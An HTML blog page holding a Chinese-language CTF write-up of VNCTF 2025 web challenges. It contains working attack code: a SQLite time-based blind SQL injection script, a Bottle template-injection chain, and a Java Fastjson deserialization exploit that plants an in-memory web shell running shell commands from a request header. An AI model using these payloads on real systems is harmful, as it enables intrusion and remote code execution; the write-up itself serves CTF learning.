@@ -1,0 +1,446 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Web3看到路径穿越下key伪造jwt，也绕过沙箱弹到shell了，就剩一个提权。但这几天比较累，到后面实在是熬不动了，睡觉去了。今早起来看到环境变量提权的可能，但是最后还是没跑赢时间，导致差一题差一点就web方向第2了。 web单方向最终第10，我是前10里面唯一一个只出了三道题的。也许遗憾真的总">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VNCTF 2025 web wp">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="Web3看到路径穿越下key伪造jwt，也绕过沙箱弹到shell了，就剩一个提权。但这几天比较累，到后面实在是熬不动了，睡觉去了。今早起来看到环境变量提权的可能，但是最后还是没跑赢时间，导致差一题差一点就web方向第2了。 web单方向最终第10，我是前10里面唯一一个只出了三道题的。也许遗憾真的总">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/06.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/07.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/08.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/09.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/10.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/11.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/12.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/13.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/14.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/15.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/16.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/17.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/18705991/18.png">
+<meta property="article:published_time" content="2025-02-09T04:44:00.000Z">
+<meta property="article:modified_time" content="2025-02-09T04:44:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/18705991/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>VNCTF 2025 web wp</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-03-08-xyctf-2025-wp-lamentxu/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-01-26-lamentxu-2024-2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&text=VNCTF 2025 web wp"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&is_video=false&description=VNCTF 2025 web wp"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VNCTF 2025 web wp&body=Check out this article: https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&title=VNCTF 2025 web wp"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&name=VNCTF 2025 web wp&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-02-09-vnctf-2025-web-wp/&t=VNCTF 2025 web wp"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A5%B6%E9%BE%99%E5%9B%9E%E5%AE%B6"><span class="toc-number">1.</span> <span class="toc-text">奶龙回家</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AD%A6%E7%94%9F%E5%A7%93%E5%90%8D%E7%99%BB%E8%AE%B0%E7%B3%BB%E7%BB%9F"><span class="toc-number">2.</span> <span class="toc-text">学生姓名登记系统</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#JavaGuide"><span class="toc-number">3.</span> <span class="toc-text">JavaGuide</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gin"><span class="toc-number">4.</span> <span class="toc-text">Gin</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VNCTF 2025 web wp
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-02-09T04:44:00.000Z" class="dt-published" itemprop="datePublished">2025-02-09</time>
+        
+        (Updated: <time datetime="2025-02-09T04:44:00.000Z" class="dt-updated" itemprop="dateModified">2025-02-09</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Python/" rel="tag">Python</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>Web3看到路径穿越下key伪造jwt，也绕过沙箱弹到shell了，就剩一个提权。但这几天比较累，到后面实在是熬不动了，睡觉去了。今早起来看到环境变量提权的可能，但是最后还是没跑赢时间，导致差一题差一点就web方向第2了。</p>
+<p><img src="/images/migrated/18705991/01.png"></p>
+<p>web单方向最终第10，我是前10里面唯一一个只出了三道题的。也许遗憾真的总是贯穿人生始终吧。</p>
+<h1 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h1><p>这题我一血。感觉是最简单的一道。我JavaGuide燃尽了才解出来，这个题十分钟就出了，最后JavaGuide解是这个的两倍。绷。</p>
+<p>首先测SQL注入闭合的方式。<code>1&quot;</code>发现回显“账号密码错误！！”，<code>1&#39;</code>发现回显“好像发生了某种错误？？”。到这里可以确诊是sql注入。</p>
+<p>接下来burp fuzz一下。过滤了空格，sleep，or，等于号这些。但是都还好。空格可以&#x2F;**&#x2F;代替。or其实根本不需要，直接用and就行，等于号的话用大于小于代替，sleep这个更是幽默——他是sqlite（我试的时候发现对大小写敏感我大概就猜到了），sqlite里没有sleep函数（（（（这里我们使用最经典的randombolb函数延时，逐字符爆破username和password即可</p>
+<p>那么大概思路就是一个sqlite的时间盲注。</p>
+<p>先试payload</p>
+<p><code>1&#39;/**/or/**/(case/**/when(2&gt;1)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*</code></p>
+<p>发现明显的时间延迟。</p>
+<p>一眼顶针了，后面就是经典的时盲二分法。直接可以拿网上的脚本搓出来。</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/324785.html">https://www.freebuf.com/articles/network/324785.html</a></p>
+<p>抄脚本下来，由于这里靶机比较卡，我们增大randombolb的参数让他多sleep一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">url = &#x27;http://node.vnteam.cn:46709/login&#x27;</span><br><span class="line">flag = &#x27;&#x27;</span><br><span class="line">for i in range(1,500):</span><br><span class="line"> low = 32</span><br><span class="line"> high = 128</span><br><span class="line"> mid = (low+high)//2</span><br><span class="line"> while(low&lt;high):</span><br><span class="line">     time.sleep(0.2)</span><br><span class="line">     payload = &quot;-1&#x27;/**/or/**/(case/**/when(substr((select/**/hex(group_concat(password))/**/from/**/users),&#123;0&#125;,1)&gt;&#x27;&#123;1&#125;&#x27;)/**/then/**/randomblob(100000000)/**/else/**/0/**/end)/*&quot;.format(i,chr(mid))</span><br><span class="line">#把payload里password换成username打username</span><br><span class="line">     datas = &#123;</span><br><span class="line">         &quot;username&quot;:&quot;1&quot;,</span><br><span class="line">         &quot;password&quot;: payload</span><br><span class="line">     &#125;</span><br><span class="line">     # print(datas)</span><br><span class="line">     start_time=time.time()</span><br><span class="line">     res = requests.post(url=url,json=datas)</span><br><span class="line">     end_time=time.time()</span><br><span class="line">     spend_time=end_time-start_time</span><br><span class="line">     if spend_time&gt;=0.4: #这里需要调一下。要先跑几次必会延迟的请求测试一下平均延时。</span><br><span class="line">         low = mid+1</span><br><span class="line">     else:</span><br><span class="line">         high = mid</span><br><span class="line">     mid = (low+high)//2</span><br><span class="line"> if(mid ==32 or mid ==127):</span><br><span class="line">     break</span><br><span class="line"> flag = flag+chr(mid)</span><br><span class="line"> print(flag)</span><br><span class="line">print(&#x27;\n&#x27;+bytes.fromhex(flag).decode(&#x27;utf-8&#x27;))</span><br></pre></td></tr></table></figure>
+
+<p>由上，我们爆破出username为nailong，password为woaipangmao114514</p>
+<p>登录获得flag</p>
+<h1 id="学生姓名登记系统"><a href="#学生姓名登记系统" class="headerlink" title="学生姓名登记系统"></a>学生姓名登记系统</h1><p>由“单文件框架”猜到是bottle。</p>
+<p>翻阅bottle的开发手册，可以看到他渲染templete的模板引擎叫SimpleTemplate，手册如下：</p>
+<p><a target="_blank" rel="noopener" href="https://www.osgeo.cn/bottle/stpl.html">https://www.osgeo.cn/bottle/stpl.html</a></p>
+<p>我们可以看到有：</p>
+<p><img src="/images/migrated/18705991/02.png"></p>
+<p>通过测试如下payload，我们确认是bottle框架：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;setdefault(&#x27;a&#x27;,&#x27;b&#x27;)&#125;&#125;</span><br><span class="line">&#123;&#123;a&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<p><img src="/images/migrated/18705991/03.png"></p>
+<p>可以看到我们成功定义了变量a的值为”b”。</p>
+<p>通过fuzz可以看到，对于单行有23的长度限制。因此我们的基本思路是采用变量赋值的办法把payload拆成多行，最后再拼到一起即可。</p>
+<p>然而我们不得不发现，setdefault有点太长了，光是<code>{{setdefault(&#39;a&#39;,&#39;b&#39;)}}</code>这样的payload都已经极限23个字符了。根本无法实现最后的拼接。</p>
+<p>于是我们接着去看代码。</p>
+<p>可以发现，我们不能直接用赋值符号&#x3D;来进行赋值。SimpleTemplate不能正确解析{{a&#x3D;”b”}}这种语句。</p>
+<p><img src="/images/migrated/18705991/04.png"></p>
+<p>我们可以看到python版本为3.12，而自从python3.8之后，python引入了一种新的赋值语句：海象运算符。</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/351140647">https://zhuanlan.zhihu.com/p/351140647</a></p>
+<p>我们可以使用{{a:&#x3D;”b”}}的语句来赋值吗？</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=&quot;b&quot;&#125;&#125;</span><br><span class="line">&#123;&#123;a&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18705991/05.png"></p>
+<p>由此特性易得payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a:=&#x27;&#x27;.__class__&#125;&#125;</span><br><span class="line">&#123;&#123;b:=a.__base__&#125;&#125;</span><br><span class="line">&#123;&#123;c:=b.__subclasses__&#125;&#125;</span><br><span class="line">&#123;&#123;d:=c()&#125;&#125;</span><br><span class="line">&#123;&#123;e:=d[154]&#125;&#125;</span><br><span class="line">&#123;&#123;f:=e.__init__&#125;&#125;</span><br><span class="line">&#123;&#123;g:=f.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在环境变量里找到flag</p>
+<p><img src="/images/migrated/18705991/06.png"></p>
+<h1 id="JavaGuide"><a href="#JavaGuide" class="headerlink" title="JavaGuide"></a>JavaGuide</h1><p>ObjectInputStream（反序列化）输入数据可控，同时引入Fastjson依赖。那么题其实就是打fastjson。但是，是高版本的，重写了resolveClass，禁止了TemplatesImpl，直接把RCE的终点砍废了。</p>
+<p>因此我们使用SignedObject类打二次反序列化，通过注入java内存马的方式RCE。</p>
+<p>此事在CISCN 2024决赛中亦有记载：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/15977">https://xz.aliyun.com/news/15977</a></p>
+<p>有一篇几乎完全重合的文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12052">https://xz.aliyun.com/news/12052</a></p>
+<p>跟着打就完了。</p>
+<p>链子：hashMap2.readObject -&gt; eventListenerList.readObject -&gt; UndoManager.toString -&gt; Vector.toString -&gt; JSONArray1.toString -&gt; SignedObject.getObject -&gt; hashMap1.readObject-&gt;XString.equals -&gt; JSONArray.toString -&gt; TemplatesImpl.getOutputProperties</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">import com.alibaba.fastjson.JSONArray;</span><br><span class="line">import javax.swing.event.EventListenerList;</span><br><span class="line">import javax.swing.undo.UndoManager;</span><br><span class="line">import javax.xml.bind.DatatypeConverter;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.security.*;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line">import java.util.Vector;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xpath.internal.objects.XString;</span><br><span class="line">import javassist.ClassPool;</span><br><span class="line">import javassist.CtClass;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import javassist.CtNewConstructor;</span><br><span class="line">import org.springframework.aop.target.HotSwappableTargetSource;</span><br><span class="line">public class EXP &#123;</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] genPayload(String cmd) throws Exception&#123;</span><br><span class="line">        ClassPool classPool = ClassPool.getDefault();</span><br><span class="line">        CtClass clazz = classPool.makeClass(&quot;A&quot;);</span><br><span class="line">        if ((clazz.getDeclaredConstructors()).length != 0) &#123;</span><br><span class="line">            clazz.removeConstructor(clazz.getDeclaredConstructors()[0]);</span><br><span class="line">        &#125;        clazz.addConstructor(CtNewConstructor.make(&quot;public B() throws Exception &#123;\n&quot; +</span><br><span class="line">                &quot;                org.springframework.web.context.request.RequestAttributes requestAttributes = org.springframework.web.context.request.RequestContextHolder.getRequestAttributes();\n&quot; +</span><br><span class="line">                &quot;                javax.servlet.http.HttpServletRequest httprequest = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getRequest();\n&quot; +</span><br><span class="line">                &quot;                javax.servlet.http.HttpServletResponse httpresponse = ((org.springframework.web.context.request.ServletRequestAttributes) requestAttributes).getResponse();\n&quot; +</span><br><span class="line">                &quot;                String[] cmd =  new String[]&#123;\&quot;sh\&quot;, \&quot;-c\&quot;, httprequest.getHeader(\&quot;C\&quot;)&#125;;\n&quot; +</span><br><span class="line">                &quot;                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\&quot;\\\\A\&quot;).next().getBytes();\n&quot; +</span><br><span class="line">                &quot;                httpresponse.getWriter().write(new String(result));\n&quot; +</span><br><span class="line">                &quot;                httpresponse.getWriter().flush();\n&quot; +</span><br><span class="line">                &quot;                httpresponse.getWriter().close();\n&quot; +</span><br><span class="line">                &quot;        &#125;&quot;, clazz));</span><br><span class="line">        clazz.getClassFile().setMajorVersion(50);</span><br><span class="line">        CtClass superClass = classPool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        return clazz.toBytecode();</span><br><span class="line">    &#125;</span><br><span class="line">    public static Field getField ( final Class&lt;?&gt; clazz, final String fieldName ) throws Exception &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Field field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            if ( field != null )</span><br><span class="line">                field.setAccessible(true);</span><br><span class="line">            else if ( clazz.getSuperclass() != null )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            return field;</span><br><span class="line">        &#125;</span><br><span class="line">        catch ( NoSuchFieldException e ) &#123;</span><br><span class="line">            if ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                return getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            throw e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception &#123;</span><br><span class="line">        final Field field = getField(obj.getClass(), fieldName);</span><br><span class="line">        return field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates = TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, &quot;_bytecodes&quot;, new byte[][]&#123;genPayload(&quot;whoami&quot;)&#125;);</span><br><span class="line">        setValue(templates, &quot;_name&quot;, &quot;1&quot;);</span><br><span class="line">        setValue(templates, &quot;_tfactory&quot;, null);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray = new JSONArray();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        HotSwappableTargetSource h1 = new HotSwappableTargetSource(jsonArray);</span><br><span class="line">        HotSwappableTargetSource h2 = new HotSwappableTargetSource(new Object());</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(h1,h1);</span><br><span class="line">        hashMap.put(h2,h2);</span><br><span class="line">        Class clazz=h2.getClass();</span><br><span class="line">        Field transformerdeclaredField = clazz.getDeclaredField(&quot;target&quot;);</span><br><span class="line">        transformerdeclaredField.setAccessible(true);</span><br><span class="line">        transformerdeclaredField.set(h2,new XString(&quot;xxx&quot;));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; hashMap1 = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap1.put(templates,hashMap);</span><br><span class="line"></span><br><span class="line">        KeyPairGenerator keyPairGenerator;</span><br><span class="line">        keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">        keyPairGenerator.initialize(1024);</span><br><span class="line">        KeyPair keyPair = keyPairGenerator.genKeyPair();</span><br><span class="line">        PrivateKey privateKey = keyPair.getPrivate();</span><br><span class="line">        Signature signingEngine = Signature.getInstance(&quot;DSA&quot;);</span><br><span class="line">        SignedObject signedObject = new SignedObject(hashMap1,privateKey,signingEngine);</span><br><span class="line"></span><br><span class="line">        JSONArray jsonArray1 = new JSONArray();</span><br><span class="line">        jsonArray1.add(signedObject);</span><br><span class="line"></span><br><span class="line">        EventListenerList eventListenerList = new EventListenerList();</span><br><span class="line">        UndoManager undoManager = new UndoManager();</span><br><span class="line">        Vector vector = (Vector) getFieldValue(undoManager, &quot;edits&quot;);</span><br><span class="line">        vector.add(jsonArray1);</span><br><span class="line">        setValue(eventListenerList, &quot;listenerList&quot;, new Object[]&#123;InternalError.class, undoManager&#125;);</span><br><span class="line"></span><br><span class="line">        HashMap hashMap2 = new HashMap();</span><br><span class="line">        hashMap2.put(vector,eventListenerList);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(hashMap2);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        byte [] bytes=byteArrayOutputStream.toByteArray();</span><br><span class="line">        String base64encode= DatatypeConverter.printBase64Binary(bytes);</span><br><span class="line">        BufferedWriter bufferedWriter=new BufferedWriter(new FileWriter(&quot;Ser3.bin&quot;));</span><br><span class="line">        bufferedWriter.write(base64encode);</span><br><span class="line">        bufferedWriter.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(byteArrayOutputStream.toByteArray()));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/18705991/07.png"></p>
+<h1 id="Gin"><a href="#Gin" class="headerlink" title="Gin"></a>Gin</h1><p>嗨，结束时间10：00，嗨。为什么不肯多给我一个小时呢？</p>
